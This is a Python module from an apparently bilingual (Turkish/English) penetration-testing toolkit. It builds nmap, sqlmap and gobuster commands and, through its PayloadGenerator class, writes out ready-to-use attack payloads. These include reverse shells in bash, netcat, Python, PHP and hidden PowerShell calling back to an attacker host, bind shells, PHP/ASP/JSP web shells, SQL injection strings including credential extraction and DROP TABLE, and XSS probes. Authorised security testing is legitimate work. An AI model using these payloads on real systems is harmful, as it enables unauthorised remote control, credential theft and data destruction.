# core/tools.py
# Penetration Testing Tools Wrappers

import os
import base64
from typing import Optional, Dict, List
from dataclasses import dataclass


@dataclass
class ScanResult:
    """Scan result data"""
    tool: str
    target: str
    success: bool
    output: str
    findings: List[str]


class NmapWrapper:
    """Nmap scanner wrapper"""
    
    def __init__(self):
        self.tool = "nmap"
    
    def quick_scan(self, target: str) -> str:
        """Quick port scan (top 100 ports)"""
        return f"nmap -F {target}"
    
    def full_scan(self, target: str) -> str:
        """Full port scan with version detection"""
        return f"nmap -p- -sV -sC -A -T4 {target}"
    
    def stealth_scan(self, target: str) -> str:
        """Stealth SYN scan"""
        return f"nmap -sS -T2 {target}"
    
    def vuln_scan(self, target: str) -> str:
        """Vulnerability scan with NSE scripts"""
        return f"nmap --script vuln {target}"
    
    def service_scan(self, target: str, ports: str = "80,443,22,21,3306") -> str:
        """Scan specific ports with service detection"""
        return f"nmap -p {ports} -sV {target}"
    
    def parse_output(self, output: str) -> List[str]:
        """Parse nmap output for findings"""
        findings = []
        
        for line in output.split('\n'):
            line = line.strip()
            # Open ports
            if '/tcp' in line or '/udp' in line:
                if 'open' in line:
                    findings.append(f"Open port: {line}")
            # OS detection
            elif 'OS' in line and 'CPE' not in line:
                findings.append(f"OS info: {line}")
            # Vulnerabilities
            elif 'CVE' in line or 'VULNERABLE' in line:
                findings.append(f"⚠️  Vulnerability: {line}")
        
        return findings


class SqlmapWrapper:
    """SQLmap wrapper for SQL injection testing"""
    
    def __init__(self):
        self.tool = "sqlmap"
    
    def basic_test(self, url: str) -> str:
        """Basic SQL injection test"""
        return f"sqlmap -u '{url}' --batch --risk=1 --level=1"
    
    def aggressive_test(self, url: str) -> str:
        """Aggressive SQL injection test"""
        return f"sqlmap -u '{url}' --batch --risk=3 --level=5 --threads=5"
    
    def dump_database(self, url: str, database: str) -> str:
        """Dump specific database"""
        return f"sqlmap -u '{url}' --batch -D {database} --dump"
    
    def with_cookies(self, url: str, cookies: str) -> str:
        """Test with cookies"""
        return f"sqlmap -u '{url}' --batch --cookie='{cookies}'"


class GobusterWrapper:
    """Gobuster directory brute force wrapper"""
    
    def __init__(self):
        self.tool = "gobuster"
    
    def dir_scan(self, url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt") -> str:
        """Directory brute force"""
        return f"gobuster dir -u {url} -w {wordlist} -t 50"
    
    def dns_scan(self, domain: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt") -> str:
        """DNS subdomain brute force"""
        return f"gobuster dns -d {domain} -w {wordlist}"
    
    def vhost_scan(self, url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt") -> str:
        """Virtual host brute force"""
        return f"gobuster vhost -u {url} -w {wordlist}"


class PayloadGenerator:
    """Generate various payloads"""
    
    def __init__(self, language: str = "tr"):
        self.language = language
    
    def reverse_shell(self, lhost: str, lport: int = 4444, shell_type: str = "bash") -> Dict[str, str]:
        """
        Generate reverse shell payloads
        
        Args:
            lhost: Attacker IP
            lport: Attacker port
            shell_type: bash, python, php, nc, powershell
        """
        payloads = {}
        
        # Bash
        payloads["bash"] = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        
        # Bash alternative
        payloads["bash_alt"] = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
        
        # Netcat
        payloads["nc"] = f"nc -e /bin/bash {lhost} {lport}"
        payloads["nc_alt"] = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
        
        # Python
        payloads["python"] = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        
        # PHP
        payloads["php"] = f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        
        # PowerShell (Windows)
        payloads["powershell"] = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        
        return payloads
    
    def bind_shell(self, port: int = 4444, shell_type: str = "nc") -> Dict[str, str]:
        """Generate bind shell payloads"""
        payloads = {}
        
        payloads["nc"] = f"nc -lvnp {port} -e /bin/bash"
        payloads["python"] = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"\",{port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        
        return payloads
    
    def web_shell(self, shell_type: str = "php") -> Dict[str, str]:
        """Generate web shell payloads"""
        payloads = {}
        
        # PHP web shells
        payloads["php_simple"] = "<?php system($_GET['cmd']); ?>"
        payloads["php_exec"] = "<?php echo shell_exec($_GET['cmd']); ?>"
        payloads["php_passthru"] = "<?php passthru($_GET['cmd']); ?>"
        
        # ASP web shells
        payloads["asp_simple"] = "<%response.write CreateObject(\"WScript.Shell\").Exec(Request.QueryString(\"cmd\")).StdOut.Readall()%>"
        
        # JSP web shells
        payloads["jsp_simple"] = "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
        
        return payloads
    
    def sql_injection(self, injection_type: str = "union") -> Dict[str, str]:
        """Generate SQL injection payloads"""
        payloads = {}
        
        # Union-based
        payloads["union_test"] = "' UNION SELECT NULL--"
        payloads["union_columns"] = "' UNION SELECT NULL,NULL,NULL--"
        payloads["union_data"] = "' UNION SELECT username,password FROM users--"
        
        # Boolean-based
        payloads["boolean_true"] = "' OR '1'='1"
        payloads["boolean_false"] = "' OR '1'='2"
        
        # Time-based
        payloads["time_mysql"] = "' OR SLEEP(5)--"
        payloads["time_postgres"] = "' OR pg_sleep(5)--"
        
        # Error-based
        payloads["error_mysql"] = "' AND extractvalue(1,concat(0x7e,database()))--"
        
        # Stacked queries
        payloads["stacked"] = "'; DROP TABLE users--"
        
        return payloads
    
    def xss_payload(self) -> Dict[str, str]:
        """Generate XSS payloads"""
        payloads = {}
        
        payloads["basic"] = "<script>alert('XSS')</script>"
        payloads["img"] = "<img src=x onerror=alert('XSS')>"
        payloads["svg"] = "<svg/onload=alert('XSS')>"
        payloads["body"] = "<body onload=alert('XSS')>"
        payloads["iframe"] = "<iframe src=javascript:alert('XSS')>"
        
        return payloads
    
    def format_payloads(self, payloads: Dict[str, str], title: str) -> str:
        """Format payloads for display"""
        output = f"\n{'='*60}\n"
        output += f"  {title}\n"
        output += f"{'='*60}\n\n"
        
        for name, payload in payloads.items():
            output += f"[{name}]\n"
            output += f"{payload}\n\n"
        
        return output


class ExploitHelper:
    """Helper for common exploits"""
    
    def __init__(self):
        pass
    
    def searchsploit(self, query: str) -> str:
        """Search exploits"""
        return f"searchsploit {query}"
    
    def metasploit_search(self, query: str) -> str:
        """Metasploit search command"""
        return f"msfconsole -q -x 'search {query}; exit'"
    
    def cve_check(self, cve_id: str) -> str:
        """Check CVE details"""
        return f"curl -s https://cve.circl.lu/api/cve/{cve_id}"
    
    def suggest_exploits(self, service: str, version: str = "") -> List[str]:
        """Suggest exploits for a service"""
        exploits = {
            "ssh": [
                "SSH user enumeration (CVE-2018-15473)",
                "Weak password brute force",
                "Private key authentication bypass"
            ],
            "ftp": [
                "Anonymous FTP access",
                "ProFTPd backdoor (CVE-2010-4221)",
                "vsftpd backdoor (CVE-2011-2523)"
            ],
            "http": [
                "Web application vulnerabilities",
                "Apache exploits",
                "Nginx vulnerabilities",
                "CMS-specific exploits (WordPress, Joomla, etc.)"
            ],
            "smb": [
                "EternalBlue (MS17-010)",
                "SMBGhost (CVE-2020-0796)",
                "Null session enumeration"
            ],
            "mysql": [
                "MySQL UDF exploit",
                "Root password brute force",
                "SQL injection"
            ]
        }
        
        return exploits.get(service.lower(), ["No specific exploits suggested"])


class ToolManager:
    """Manage all pentesting tools"""
    
    def __init__(self, language: str = "tr"):
        self.language = language
        self.nmap = NmapWrapper()
        self.sqlmap = SqlmapWrapper()
        self.gobuster = GobusterWrapper()
        self.payload_gen = PayloadGenerator(language)
        self.exploit_helper = ExploitHelper()
    
    def get_tool(self, tool_name: str):
        """Get tool wrapper by name"""
        tools = {
            "nmap": self.nmap,
            "sqlmap": self.sqlmap,
            "gobuster": self.gobuster,
            "payload": self.payload_gen,
            "exploit": self.exploit_helper
        }
        return tools.get(tool_name.lower())
    
    def list_tools(self) -> Dict[str, str]:
        """List available tools"""
        if self.language == "tr":
            return {
                "nmap": "Ağ tarayıcı - port ve servis keşfi",
                "sqlmap": "SQL injection test aracı",
                "gobuster": "Dizin ve DNS brute force",
                "payload": "Reverse/bind shell üretici",
                "exploit": "Exploit arama ve öneri"
            }
        else:
            return {
                "nmap": "Network scanner - port and service discovery",
                "sqlmap": "SQL injection testing tool",
                "gobuster": "Directory and DNS brute force",
                "payload": "Reverse/bind shell generator",
                "exploit": "Exploit search and suggestions"
            }
